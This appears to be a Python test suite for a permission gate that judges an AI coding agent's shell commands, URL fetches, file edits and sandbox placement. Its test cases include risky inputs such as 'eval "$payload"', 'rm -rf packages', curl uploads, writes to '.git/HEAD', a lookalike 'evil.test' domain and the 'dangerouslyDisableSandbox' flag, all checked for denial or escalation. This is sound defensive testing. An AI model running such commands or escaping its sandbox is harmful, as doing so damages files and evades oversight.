        autonomous=True,
    ),
    EditDecisionCase(
        path="src/new.py",
        before=None,
        after="value = 1",
        effect="ask",
        path_exists=False,
    ),
    EditDecisionCase(
        path="src/module.py", before="value = 1", after=None, effect="allow"
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1\nalpha = 2\nbeta = 3\ngamma = 4\ndelta = 5",
        effect="defer",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1\n\n# note one\n\n# note two\n\n# note three\n\n# four",
        effect="allow",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="import x",
        after=(
            "import x\n\n\nclass Config(BaseModel):\n    name: str\n"
            "    size: int\n    tags: list[str]\n    active: bool"
        ),
        effect="allow",
    ),
]


def test_policy_bundle_contains_assembly_but_no_decision_implementation() -> None:
    source = Path("packages/lup/src/lup/policy/bundle.py").read_text(encoding="utf-8")
    tree = ast.parse(source)
    functions = [node.name for node in tree.body if isinstance(node, ast.FunctionDef)]

    assert "BUNDLED_POLICY_SOURCE" not in source
    assert all(not name.startswith("decide_") for name in functions)


def test_the_neutral_kernel_never_learns_one_runtime_sandbox_spelling() -> None:
    """The kernel carries the axis; only an adapter carries a vendor's word for it.

    Codex matches on this same kernel and has no per-call sandbox at all, so a
    spelling that leaked in here would be one runtime's argument name sitting
    in the shared verdict every other runtime reads.
    """
    kernel = [item.source for item in policy_kernel_modules()]

    assert not [item for item in kernel if "dangerouslyDisableSandbox" in item]
    assert [item for item in kernel if "SandboxPlacement" in item]


def write_kernel_package(runtime: Path) -> Path:
    """Materialize the kernel package a generated runtime directory carries."""
    package = runtime / "kernel"
    package.mkdir(parents=True, exist_ok=True)
    for item in policy_kernel_modules():
        (package / item.name).write_text(item.source, encoding="utf-8")
    return package


def load_bundled_kernel(root: Path, module: str) -> ModuleType:
    """Import one module of a freshly materialized kernel copy.

    The copy is imported as a real package, so its relative imports resolve
    exactly as they do beneath a generated plugin's runtime directory rather
    than through the lup installation under test.
    """
    write_kernel_package(root)
    for name in [
        name for name in sys.modules if name == "kernel" or name.startswith("kernel.")
    ]:
        del sys.modules[name]
    sys.path.insert(0, str(root))
    try:
        return importlib.import_module(f"kernel.{module}")
    finally:
        sys.path.remove(str(root))


def assembled_edit_decision(
    module: ModuleType,
    path: str,
    before: str | None,
    after: str | None,
    protected_roots: list[str],
    human_owned_files: list[str],
    *,
    autonomous: bool = False,
) -> KernelDecision:
    """Invoke an isolated kernel with the same generated primitive rows."""
    suffix = Path(path).suffix.lower()
    rows_by_suffix = bundled_antipattern_rows()
    rows = rows_by_suffix[suffix] if suffix in rows_by_suffix else []
    return module.decide_edit(
        path,
        before,
        after,
        path_exists=Path(path).exists(),
        path_rules=runtime_path_rules(protected_roots, human_owned_files),
        antipattern_rows=rows,
        path_roles=FIXTURE_PATH_ROLES,
        autonomous=autonomous,
        python_source=suffix in (".py", ".pyi"),
    )


# lup: ignore[constant-declaration] — a fixture table, deliberately shaped
FIXTURE_EDIT_RULES: list[EditRule] = [
    EditRule(
        name="fixture-suffix-nothing-else-uses",
        suffixes=[".fixture"],
        effect="deny",
        reason="declared only to prove the rows cross the boundary",
    )
]
"""An edit table that renders and matches nothing the edit cases exercise.

The point of this test is that the assembled kernel decides identically with
no lup on the path, so the table must not move any case's verdict. What it has
to prove is narrower and still worth proving: that a declared table survives
erasure, renders into the generated data, imports under `-I -S`, and is
accepted by the kernel beside it — which an empty list would not show, since
an empty list is what the renderer emits when the field is missing entirely.
"""


def test_assembled_kernel_runs_without_site_packages(tmp_path: Path) -> None:
    runtime = tmp_path / "runtime"
    runtime.mkdir()
    write_kernel_package(runtime)
    (runtime / "policy_data.py").write_text(
        render_policy_data(
            allowed_fetch_scopes=[
                runtime_url_scope("https://docs.example.com:8443", "/reference/"),
                runtime_url_scope(
                    "https://cdn.example.org", "/", include_subdomains=True
                ),
            ],
            denied_fetch_scopes=[
                runtime_url_scope(
                    "https://docs.example.com:8443",
                    "/reference/private/",
                    "sensitive documentation path",
                )
            ],
            protected_roots=[
                ".claude",
                "pyproject.toml",
                "sync.json",
                "sync.json.local",
            ],
            human_owned_files=["README.md"],
            autonomous_agent_identities=["resolver-worker"],
            path_roles=FIXTURE_PATH_ROLES,
            acceptance_guard=None,
            shell_rules=SHELL_RULES,
            edit_rules=FIXTURE_EDIT_RULES,
            refused_tools=FIXTURE_REFUSED_TOOLS,
            recoverable_target_limit=FIXTURE_RECOVERABLE_LIMIT,
            runner_targets=FIXTURE_RUNNER_TARGETS,
            sandbox_excluded_commands=FIXTURE_EXCLUDED_COMMANDS,
            auto_escape_prefixes=[],
            diagnostics_command=[],
            resolution_command=[],
        ),
        encoding="utf-8",
    )
    fixtures = runtime / "fixtures.json"
    fixtures.write_text(
        json.dumps(
            {
                "shell": [
                    {**item.model_dump(), "existing": item.host_existing()}
                    for item in SHELL_POLICY_CASES
                ],
                "fetch": [item.model_dump() for item in FETCH_POLICY_CASES],
                "edit": [item.model_dump() for item in EDIT_POLICY_CASES],
            }
        ),
        encoding="utf-8",
    )
    probe = runtime / "probe.py"
    probe.write_text(
        "import json\n"
        "import sys\n"
        "from pathlib import Path\n"
        "sys.path.insert(0, str(Path(__file__).parent))\n"
        "from kernel.edit import decide_edit\n"
        "from kernel.fetch import decide_fetch\n"
        "from kernel.shell import decide_shell\n"
        "from policy_data import (\n"
        "    ALLOWED_FETCH_SCOPES, ANTI_PATTERN_ROWS, DENIED_FETCH_SCOPES,\n"
        "    EDIT_RULES, MAXIMUM_ADDED_LINES, PATH_ROLES, PATH_RULES,\n"
        "    RUNNER_TARGETS, SANDBOX_EXCLUDED_COMMANDS, SHELL_RULES,\n"
        ")\n"
        "assert EDIT_RULES, 'the declared edit table did not reach the runtime'\n"
        "fixtures = json.loads(\n"
        "    (Path(__file__).parent / 'fixtures.json').read_text(encoding='utf-8')\n"
        ")\n"
        "for case in fixtures['shell']:\n"
        "    result = decide_shell(\n"
        "        case['input'], SHELL_RULES, sandboxed=case['sandboxed'],\n"
        "        excluded_commands=SANDBOX_EXCLUDED_COMMANDS,\n"
        "        escapable=case['escapable'],\n"
        "        interactive=case['interactive'],\n"
        "        path_roles=PATH_ROLES,\n"
        "        path_rules=PATH_RULES,\n"
        "        existing_targets=case['existing'],\n"
        "        empty_directories=case['empty'],\n"
        "        runner_targets=RUNNER_TARGETS,\n"
        "    )\n"
        "    assert result.effect == case['effect'], case\n"
        "for case in fixtures['fetch']:\n"
        "    decision = decide_fetch(\n"
        "        case['input'], ALLOWED_FETCH_SCOPES, DENIED_FETCH_SCOPES\n"
        "    )\n"
        "    assert decision.effect == case['effect'], case\n"
        "for case in fixtures['edit']:\n"
        "    suffix = Path(case['path']).suffix.lower()\n"
        "    rows = ANTI_PATTERN_ROWS[suffix] if suffix in ANTI_PATTERN_ROWS else ()\n"
        "    decision = decide_edit(\n"
        "        case['path'], case['before'], case['after'],\n"
        "        path_exists=case['path_exists'], path_rules=PATH_RULES,\n"
        "        antipattern_rows=rows, path_roles=PATH_ROLES,\n"
        "        maximum_added_lines=MAXIMUM_ADDED_LINES,\n"
        "        autonomous=case['autonomous'],\n"
        "        python_source=suffix in ('.py', '.pyi'),\n"
        "        suffix=suffix, edit_rules=EDIT_RULES,\n"
        "    )\n"
        "    assert decision.effect == case['effect'], case\n",
        encoding="utf-8",
    )

    sh.Command("python3")("-I", "-S", str(probe), _truncate_exc=False)


def test_equivalent_multi_file_native_edits_decode_identically() -> None:
    changes = [
        EditChange(path=Path("a.py"), before="old", after="new"),
        EditChange(path=Path("b.py"), before="left", after="right"),
    ]
    claude = ClaudeEventDecoder().decode(
        ClaudeBeforeToolEvent(operation=ClaudeEditBatchOperation(changes=changes))
    )
    codex = CodexEventDecoder().decode(
        CodexBeforeToolEvent(
            operation=CodexFileChangeOperation(
                changes=[
                    CodexFileChange(
                        path=change.path,
                        before=change.before,
                        after=change.after,
                    )
                    for change in changes
                ]
            )
        )
    )

    assert claude.tool == codex.tool == EditBatch(changes=changes)


def test_unknown_tools_remain_auditable_and_ask() -> None:
    claude = ClaudeEventDecoder().decode(
        ClaudeBeforeToolEvent(operation=ClaudeUnknownOperation(name="Novel", input={}))
    )
    codex = CodexEventDecoder().decode(
        CodexBeforeToolEvent(operation=CodexUnknownOperation(name="Novel", input={}))
    )

    assert isinstance(claude.tool, UnknownTool)
    assert isinstance(codex.tool, UnknownTool)
    assert UnknownToolPolicy().decide(claude.tool).effect == "ask"
    assert UnknownToolPolicy().decide(codex.tool).effect == "ask"


def refused_tool_call(name: str, payload: JsonObject) -> UnknownTool:
    """One unclassified native call, as a decoder hands it to the policy."""
    return UnknownTool(identity=ToolIdentity(original_name=name), input=payload)


REFUSAL_CASES = [
    ("Quuxify", {"content": "a page"}, "deny"),
    ("Skill", {"skill": "quux-design"}, "deny"),
    ("Skill", {"skill": "commit"}, "defer"),
    ("Novel", {"skill": "quux-design"}, "ask"),
    ("Quuxify", {"body": "# lup: escalate: the user asked for a page\nbody"}, "ask"),
    ("Quuxify", {"body": "# lup: escalate:\nbody"}, "deny"),
]
"""What a declared refusal answers, across every shape it has to tell apart.

The whole rule reads off the rows: a refused tool denies, a refused subject
of a tool denies, another subject of that same tool passes to the runtime
rather than stopping at a human, a tool nobody mentioned stays unclassified,
a stated escalation becomes the question it asked for, and one stating
nothing does not.
"""


@pytest.mark.parametrize(("name", "payload", "effect"), REFUSAL_CASES)
def test_declared_tool_refusals_decide_identically(
    name: str, payload: JsonObject, effect: str, tmp_path: Path
) -> None:
    policy = UnknownToolPolicy(FIXTURE_REFUSED_TOOLS)
    module = load_bundled_kernel(tmp_path, "tools")
    bundled = module.decide_tool(
        name,
        [value for value in payload.values() if isinstance(value, str)],
        erase_refused_tools(FIXTURE_REFUSED_TOOLS),
    )

    assert policy.decide(refused_tool_call(name, payload)).effect == effect
    assert (bundled.effect if bundled is not None else "ask") == effect


def test_a_tool_refusal_names_what_to_reach_for_instead() -> None:
    policy = UnknownToolPolicy(FIXTURE_REFUSED_TOOLS)

    decision = policy.decide(refused_tool_call("Quuxify", {"content": "a page"}))

    assert "quuxifying leaves the repository" in decision.reason
    assert "lup: escalate:" in decision.reason


def test_malformed_native_fetch_urls_become_conservative_unknown_tools() -> None:
    from lup.providers.claude.native import ClaudeFetchOperation
    from lup.providers.codex.native import CodexFetchOperation

    claude = ClaudeEventDecoder().decode(
        ClaudeBeforeToolEvent(operation=ClaudeFetchOperation(url="not a url"))
    )
    codex = CodexEventDecoder().decode(
        CodexBeforeToolEvent(operation=CodexFetchOperation(url="not a url"))
    )

    assert isinstance(claude.tool, UnknownTool)
    assert isinstance(codex.tool, UnknownTool)


def test_native_decision_renderers_preserve_or_fail_closed_on_ask() -> None:
    decision = Decision(effect="ask", reason="approval required")

    claude = ClaudeDecisionRenderer().render(decision)
    codex = CodexDecisionRenderer(supports_ask=False).render(decision)

    assert claude.permission_decision == "ask"
    assert codex.exit_code == 2
    assert codex.approximation == "ask rendered as fail-closed denial"
    with pytest.raises(ValueError, match="not been evidenced"):
        CodexDecisionRenderer(supports_ask=True)


def test_the_decision_effect_stays_closed_at_four_members() -> None:
    """Where an operation runs is the other axis, never a fifth effect.

    A member per placement would need an ask-plus-elsewhere next and then
    a deny-plus-elsewhere, so the two questions stay two fields. Three
    placements rather than four: what a rule used to spell ``escalable``
    is a request the agent writes and a reviewer answers, which is not a
    place an operation can be.
    """
    assert sorted(get_args(DecisionEffect.__value__)) == [
        "allow",
        "ask",
        "defer",
        "deny",
    ]
    assert sorted(get_args(SandboxPlacement.__value__)) == [
        "ambient",
        "inside",
        "outside",
    ]
    assert Decision(effect="allow", sandbox="outside").effect == "allow"


def test_the_settled_sandbox_composition_rows_render_as_decided() -> None:
    """Every settled pair a rewrite renders, on a runtime that can place a call.

    The placement is an argument of the call on Claude Code, so an allow that
    escapes is an allow plus a rewrite; an ask that escapes is asking two
    things at once, so the reason says both — and what it says is the host,
    because a placement that named only a native sandbox could be honoured
    by a session that never left the container it was really about.
    """
    shell: JsonObject = {"command": "git ls-remote origin HEAD"}
    render = ClaudeDecisionRenderer().render

    asked = render(
        Decision(effect="ask", reason="needs a human", sandbox="outside"), shell
    )
    denied = render(Decision(effect="deny", reason="refused", sandbox="outside"), shell)
    confined = render(Decision(effect="allow", sandbox="inside"), shell)
    ambient = render(Decision(effect="allow", sandbox="ambient"), shell)
    escaped = render(Decision(effect="allow", sandbox="outside"), shell)

    assert asked.permission_decision == "ask"
    assert asked.reason == (
        "needs a human — this will run on the host, outside the boundary"
    )
    assert asked.updated_input == {**shell, "dangerouslyDisableSandbox": True}
    assert (denied.permission_decision, denied.updated_input) == ("deny", None)
    assert confined.updated_input == {**shell, "dangerouslyDisableSandbox": False}
    assert (ambient.permission_decision, ambient.updated_input) == ("allow", None)
    assert escaped.updated_input == {**shell, "dangerouslyDisableSandbox": True}


def test_a_deny_short_circuits_whatever_the_sandbox_says() -> None:
    """Where a call would have run cannot soften a refusal.

    Held at construction rather than checked at each renderer, so no boundary
    can read a placement off a verdict that reached none.
    """
    assert KernelDecision("deny", "refused", "outside").sandbox == "ambient"
    assert Decision(effect="deny", reason="refused", sandbox="outside").sandbox == (
        "ambient"
    )
    assert KernelDecision("defer", "unjudged", "outside").sandbox == "ambient"

    refused = KernelDecision("deny", "refused", "outside")
    placed = refused.placed(escapable=True)
    assert (refused.sandbox, placed.reason) == ("ambient", "refused")


def test_a_runtime_that_cannot_place_a_call_renders_the_plain_effect() -> None:
    """A Codex verdict rewrites nothing, so an intent it cannot perform is dropped.

    Degrading in silence is the failure this pins: an escape rendered into a
    channel that ignores it reads as honoured to everything upstream, and the
    call runs confined with nobody told.
    """
    escaped = Decision(effect="allow", reason="fine", sandbox="outside")
    asked = Decision(effect="ask", reason="needs a human", sandbox="outside")

    codex = CodexDecisionRenderer(supports_ask=False)

    assert codex.render(escaped).exit_code == 0
    assert "outside the sandbox" not in codex.render(asked).stderr
    assert escaped.placed(escapable=False) == Decision(effect="allow", reason="fine")


def test_which_placements_leave_is_one_answer_two_renderers_cannot_differ() -> None:
    """Four boundaries render the crossing, so the condition is written once.

    Both hook factories, the in-process renderer, and each compiled dispatcher
    fill the same field. A condition spelled at four sites is one that can be
    spelled differently at four sites, which is how a placement came to be
    honoured on one path and stripped on the other.
    """
    assert sandbox_escaped("outside") is True
    assert sandbox_escaped("inside") is False
    assert sandbox_escaped("ambient") is False


def test_a_placement_lup_states_is_not_the_call_asking_for_itself() -> None:
    """A native flag the agent set is a fact, never a request Lup honours.

    Asking for the launcher's host is a marker a reviewer answers. A call that
    set the provider's own escape flag has said something narrower and only
    ever tightening — it will not be confined by that sandbox — so an
    ``inside`` placement overwrites it rather than reading it as consent.
    """
    held = Decision(effect="allow", reason="fine", sandbox="inside")
    asked_out: JsonObject = {"command": "x", "dangerouslyDisableSandbox": True}

    rendered = ClaudeDecisionRenderer().render(held, asked_out)

    assert rendered.updated_input == {**asked_out, "dangerouslyDisableSandbox": False}


def test_fetch_policy_normalizes_origin_and_rejects_lookalikes() -> None:
    policy = FetchPolicy(
        allowed=[
            UrlScope(
                origin=AnyHttpUrl("https://docs.example.com"),
                path_prefix="/reference/",
            )
        ],
        denied=[],
    )

    assert (
        policy.decide(
            FetchUrl(url=AnyHttpUrl("https://docs.example.com/reference/api?q=1"))
        ).effect
        == "allow"
    )
    assert (
        policy.decide(
            FetchUrl(url=AnyHttpUrl("https://docs.example.com.evil.test/reference/api"))
        ).effect
        == "ask"
    )


def test_bundled_fetch_matches_canonical_scheme_port_and_path(tmp_path: Path) -> None:
    bundled = load_bundled_kernel(tmp_path, "fetch")
    scope = UrlScope(
        origin=AnyHttpUrl("https://docs.example.com:8443"),
        path_prefix="/reference/",
    )
    denied_scope = UrlScope(
        origin=AnyHttpUrl("https://docs.example.com:8443"),
        path_prefix="/reference/private/",
        reason="sensitive documentation path",
    )
    subdomain_scope = UrlScope(
        origin=AnyHttpUrl("https://cdn.example.org"), include_subdomains=True
    )
    policy = FetchPolicy(allowed=[scope, subdomain_scope], denied=[denied_scope])
    wire_scope = [
        runtime_url_scope(str(scope.origin), scope.path_prefix),
        runtime_url_scope(
            str(subdomain_scope.origin),
            subdomain_scope.path_prefix,
            include_subdomains=True,
        ),
    ]
    denied_wire_scope = [
        runtime_url_scope(
            str(denied_scope.origin), denied_scope.path_prefix, denied_scope.reason
        )
    ]

    for case in FETCH_POLICY_CASES:
        canonical = policy.decide(FetchUrl(url=AnyHttpUrl(case.input)))
        generated = bundled.decide_fetch(case.input, wire_scope, denied_wire_scope)
        assert canonical.effect == generated.effect == case.effect


def test_curl_screen_consults_the_declared_fetch_scopes() -> None:
    policy = ShellPolicy(
        SHELL_RULES,
        allowed_urls=[UrlScope(origin=AnyHttpUrl("https://docs.example.com"))],
        denied_urls=[UrlScope(origin=AnyHttpUrl("https://internal.example.com"))],
    )

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("curl -s https://docs.example.com/api/one") == "allow"
    # A cluster is one word to the shell and to curl, so it is judged as the
    # flags it spells rather than as an option nobody declared.
    assert effect("curl -sI https://docs.example.com/") == "allow"
    assert effect("curl -s -I https://docs.example.com/") == "allow"
    assert effect("curl -sSf https://docs.example.com/") == "allow"
    # Only the declared reporting letters cluster. One that follows redirects
    # or carries a body reaches past the scopes, so it stays unclassified
    # wherever it is spelled.
    assert effect("curl -fsSL https://docs.example.com/") == "deny"
    assert effect("curl -sd a=b https://docs.example.com/api") == "deny"
    assert effect("curl -s https://internal.example.com/x") == "deny"
    assert effect("curl -s https://elsewhere.example.com/") == "ask"
    assert effect("curl -X DELETE https://docs.example.com/api") == "ask"
    assert effect("curl -d a=b https://docs.example.com/api") == "deny"


def test_a_schemeless_curl_url_is_judged_the_way_curl_resolves_it() -> None:
    """curl guesses HTTP for a bare host, and so does the screen judging it.

    `curl localhost:8000/health` is how a liveness probe is typed, and
    reading it as a malformed URL put an approval question on the one form
    an agent reaches for while the fully spelled twin was already declared
    safe. Guessing where curl guesses keeps the verdict conservative: the
    guess is HTTP, so an origin declared for TLS alone is not covered by it.
    """
    policy = ShellPolicy(
        SHELL_RULES,
        allowed_urls=[
            UrlScope(origin=AnyHttpUrl("http://localhost"), any_port=True),
            UrlScope(origin=AnyHttpUrl("https://docs.example.com")),
        ],
    )

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    assert effect("curl -s localhost:8000/health") == "allow"
    assert effect("curl -s http://localhost:8000/health") == "allow"
    # The guess is HTTP, so a scope that only ever declared HTTPS is unmatched
    # and the bare spelling asks rather than inheriting a grant.
    assert effect("curl -s docs.example.com/api") == "ask"
    assert effect("curl -s https://docs.example.com/api") == "allow"


def test_a_scope_may_cover_every_port_on_one_host() -> None:
    """A local service is the same service at whatever port it was started on.

    Every surface this repository serves takes `--port`, so a scope pinned to
    one number puts the question back the first time somebody moves it —
    while the reason loopback is grantable at all, that nothing off this
    machine can reach it, holds at every port equally.
    """
    policy = FetchPolicy(
        [
            UrlScope(origin=AnyHttpUrl("http://127.0.0.1"), any_port=True),
            UrlScope(origin=AnyHttpUrl("https://pinned.example.com:8443")),
        ],
        [],
    )

    def effect(url: str) -> str:
        return policy.decide(FetchUrl(url=AnyHttpUrl(url))).effect

    assert effect("http://127.0.0.1:8765/api/runs") == "allow"
    assert effect("http://127.0.0.1:9999/") == "allow"
    assert effect("http://127.0.0.1/") == "allow"
    assert effect("https://pinned.example.com:8443/x") == "allow"
    assert effect("https://pinned.example.com:9000/x") == "ask"


def committed_tree(root: Path, *names: str) -> None:
    """A repository whose every named file is tracked with nothing pending.

    The recoverable grant is the host's answer to a Git question, so a case
    about it needs a real repository rather than a stub: what is being tested
    is that `ls-files` and `status --porcelain` agree a path costs a checkout.
    """
    sh.Command("git")("init", "-q", str(root))
    for name in names:
        (root / name).write_text("body\n", encoding="utf-8")
    git = sh.Command("git").bake(
        "-C", str(root), "-c", "user.email=t@e", "-c", "user.name=t"
    )
    git("add", "-A")
    git("commit", "-qm", "in")


def test_a_recoverable_grant_never_covers_a_protected_path(tmp_path: Path) -> None:
    """Git restoring a file says nothing about who is allowed to replace it.

    The grant answers what destroying a path costs, which is the wrong
    question for one protected by ownership: a clean tracked `README.md` is
    exactly as restorable as any other file, and exactly as off-limits. The
    two gates read one table so they cannot come to differ about a path.
    """
    committed_tree(tmp_path, "README.md", "notes.md")
    policy = ShellPolicy(
        SHELL_RULES,
        path_rules=[human_owned_path_rule("README.md")],
        runner_targets=FIXTURE_RUNNER_TARGETS,
    )

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert effect("rm notes.md") == "allow"
    assert effect("rm README.md") == "ask"
    assert effect("cp notes.md README.md") == "ask"
    # Restoring one grants on the same host fact, so it defers to the same
    # table: a clean README.md is exactly as restorable and exactly as owned.
    assert effect("git restore notes.md") == "allow"
    assert effect("git restore README.md") == "ask"


def test_restoring_a_file_that_holds_no_pending_work_changes_nothing(
    tmp_path: Path,
) -> None:
    """The restore row asks about discarded work, so it should not ask when there is none.

    Whether `git restore <path>` costs anything is the same question `rm
    <path>` poses and the same host answer settles it: a tracked path with no
    uncommitted change has nothing the index does not already hold, so the
    restore writes back the bytes on disk. Pending work restores the ask,
    which is the only case the row was ever about.
    """
    committed_tree(tmp_path, "notes.md", "other.md")
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert effect("git restore notes.md") == "allow"
    assert effect("git restore --staged notes.md") == "allow"
    assert effect("git restore notes.md other.md") == "allow"
    # Deleting and restoring the same clean path agree, because one host fact
    # answers both.
    assert effect("rm notes.md") == "allow"
    # Uncommitted work, an untracked path, and a directory each keep the ask:
    # the first would be discarded, and the host vouches for neither of the
    # others.
    (tmp_path / "notes.md").write_text("uncommitted\n", encoding="utf-8")
    assert effect("git restore notes.md") == "ask"
    assert effect("git restore notes.md other.md") == "ask"
    assert effect("git restore untracked.md") == "ask"
    assert effect("git restore .") == "ask"


def test_a_runner_target_a_project_refuses_is_refused_with_its_own_reason(
    tmp_path: Path,
) -> None:
    """Leaving a costly target undeclared is not a refusal.

    An undeclared `uv run <target>` reaches no judgment, and no judgment is
    a different answer from no: confined it stays a defer, where this policy
    has said nothing and the runtime's own permissions decide. A project
    that means to stop a target which spends money or runs for an hour has
    to be able to say so on the table that already names its targets. The
    reason carries most of the value — the agent needs the other way to
    reach the same end, not only the refusal.
    """
    targets = [
        RunnerTargetRule(name="pytest", effects=[declare("runs_declared_target")]),
        RunnerTargetRule(
            name="forecast",
            effects=[declare("runs_declared_target")],
            refuses="forecasts are the user's to run",
            reason="forecasts are the user's to run — print the exact command",
        ),
        RunnerTargetRule(
            name="publish",
            effects=[declare("external_mutation", scope="publication")],
        ),
    ]
    policy = ShellPolicy(SHELL_RULES, runner_targets=targets)

    def decide(command: str) -> Decision:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path))

    assert decide("uv run pytest").effect == "allow"
    assert decide("uv run publish").effect == "ask"
    refused = decide("uv run forecast 'will it rain'")
    assert refused.effect == "deny"
    assert "print the exact command" in refused.reason

    # The case this exists to separate itself from. Undeclared reaches no
    # judgment: uncontained it reaches the reviewer, and contained it runs
    # inside the boundary, where everything it can affect is disposable.
    # Neither is the project's refusal, and the contained one is not a
    # refusal at any setting, which is why the table has to say so itself.
    confined = ShellPolicy(SHELL_RULES, runner_targets=targets, sandbox_active=True)

    def confined_effect(command: str) -> str:
        return confined.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert confined_effect("uv run something-else") == "allow"
    assert confined_effect("uv run forecast 'will it rain'") == "deny"


def test_a_blessed_target_can_still_refuse_one_verb_beneath_it(
    tmp_path: Path,
) -> None:
    """A toolchain is one target and many commands, judged by the same table.

    A devtools CLI mostly reads the repository, and one subcommand of it may
    open the same paid agent session the refused target does. Without verbs
    on the runner table the only choices are blessing that subcommand or
    refusing the whole toolchain, and a project takes the first every time.

    The rows and the walk are the shell table's own, so a target with verbs
    is judged exactly as the command spelled directly would be — there is
    not a second matcher here that could answer differently.
    """
    targets = [
        RunnerTargetRule(
            name="devtools",
            effects=[declare("runs_declared_target")],
            subcommands=[
                ShellSubcommandRule(
                    name="worldview",
                    operations=[
                        ShellOperationRule(
                            name="loop",
                            refuses="this opens an agent",
                            reason="this opens an agent",
                        )
                    ],
                ),
            ],
        ),
    ]
    policy = ShellPolicy(SHELL_RULES, runner_targets=targets)

    def decide(command: str) -> Decision:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path))

    assert decide("uv run devtools worldview show").effect == "allow"
    refused = decide("uv run devtools worldview loop")
    assert refused.effect == "deny"
    assert refused.reason.startswith("this opens an agent")
    # The target's own effect is the default beneath its verbs, so a verb it
    # never named inherits the blessing rather than falling off the table.
    assert decide("uv run devtools status").effect == "allow"


def test_moving_a_recoverable_file_costs_what_deleting_it_costs(
    tmp_path: Path,
) -> None:
    """A move is a delete and a create, and neither half is worth a question.

    The verb wrote both operands, so a destination that did not exist yet
    failed the recoverable test and took the whole command to an ask — which
    left `mv` asking about a file `rm` would have removed without one, for
    the sake of a path that holds nothing.
    """
    committed_tree(tmp_path, "notes.md", "other.md")
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    assert effect("rm notes.md") == "allow"
    assert effect("mv notes.md renamed.md") == "allow"
    assert effect("cp notes.md copy.md") == "allow"
    # Replacing a tracked, clean file still costs only a checkout; replacing
    # one the host cannot vouch for costs whatever was in it.
    assert effect("mv notes.md other.md") == "allow"
    (tmp_path / "dirty.md").write_text("uncommitted\n", encoding="utf-8")
    assert effect("mv notes.md dirty.md") == "ask"
    # Content leaving a scratch root enters production without the edit gate
    # ever having read it, so an empty destination is not the whole question.
    scratch = ShellPolicy(
        SHELL_RULES,
        path_roles=FIXTURE_PATH_ROLES,
        runner_targets=FIXTURE_RUNNER_TARGETS,
    )
    (tmp_path / "tmp").mkdir()
    (tmp_path / "tmp" / "draft.md").write_text("draft\n", encoding="utf-8")
    assert (
        scratch.decide(
            ShellCommand(command="mv tmp/draft.md arrived.md", cwd=tmp_path)
        ).effect
        == "ask"
    )


def test_redirecting_over_a_file_costs_what_deleting_it_costs(
    tmp_path: Path,
) -> None:
    """The three writing forms answer one question about the same path.

    A redirection's target was resolved for existence but never for
    recoverability, so `rm notes.md` and `cp x notes.md` were granted while
    `echo x > notes.md` asked about the identical clean, tracked file. The
    heredoc form carried a further deny, justified by an edit gate a
    redirection into a *new* file already bypasses — so it drew the line
    where the cost was lowest rather than where the risk was.
    """
    committed_tree(tmp_path, "notes.md")
    policy = ShellPolicy(
        SHELL_RULES,
        path_rules=[human_owned_path_rule("README.md")],
        runner_targets=FIXTURE_RUNNER_TARGETS,
    )

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect

    # Every form writing a tracked, clean file costs one checkout.
    assert effect("rm notes.md") == "allow"
    assert effect("echo x > notes.md") == "allow"
    assert effect("echo x >> notes.md") == "allow"
    assert effect("cat > notes.md <<'EOF'\nbody\nEOF") == "allow"
    # And a file nothing can vouch for lands the same way, because vouching
    # was never what the question was about: what a command writes is read
    # after it runs, and until then only the path is knowable.
    (tmp_path / "dirty.md").write_text("uncommitted\n", encoding="utf-8")
    assert effect("echo x > dirty.md") == "allow"
    assert effect("cat > dirty.md <<'EOF'\nbody\nEOF") == "allow"
    # What the path reading *can* answer, it still answers ahead of the write.
    assert effect("echo x > README.md") == "ask"
    assert effect("echo x > .git/HEAD") == "ask"
    assert effect("echo x > ../elsewhere.md") == "ask"
    assert effect("echo x > $NAME") == "ask"
    # Ownership is a different question from cost, and still answers first.
    (tmp_path / "README.md").write_text("human\n", encoding="utf-8")
    assert effect("echo x > README.md") == "ask"


def test_shell_policy_checks_every_segment_and_deny_wins() -> None:
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    assert policy.decide(
        ShellCommand(command="git status && uv run pytest")
    ).effect == ("allow")
    assert (
        policy.decide(
            ShellCommand(command="uv add package && python -c 'print(1)'")
        ).effect
        == "deny"
    )
    assert policy.decide(ShellCommand(command="echo $(dangerous)")).effect == "ask"


def test_shell_policy_allows_control_flow_and_still_refuses_what_outlives_it() -> None:
    policy = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS)

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    # Control flow reports nothing, so it fails the "reads and reports" half of
    # the read-only test and passes the half that decides: it changes nothing,
    # and nothing it does reaches a later command.
    for builtin in ("continue", "break", "shift", "return", "local", "exit"):
        assert effect(builtin) == "allow", builtin

    # Each of these decides what some later command sees or does, which is what
    # the read-only list promises a reader it does not touch.
    for builtin in ("eval", "exec", "export", "declare", "unset"):
        assert effect(builtin) == "deny", builtin

    # Control flow de-escalates nothing around it: a guarded verb sharing the
    # command keeps its own verdict.
    assert effect("test -d tmp && continue") == "allow"
    assert effect("continue && rm -rf packages") == "ask"
    assert effect('break; eval "$payload"') == "deny"


def test_shell_policy_confines_trusted_native_skill_scripts() -> None:
    root = "/opt/codex/skills"
    policy = ShellPolicy(SHELL_RULES, trusted_script_roots=[root])

    def effect(command: str) -> str:
        return policy.decide(ShellCommand(command=command)).effect

    helper = f"{root}/.system/openai-docs/scripts/fetch-codex-manual.mjs"
    assert effect(f"node {helper}") == "allow"
    assert effect(f"if true; then sh {root}/tool/scripts/resolve; fi") == "allow"
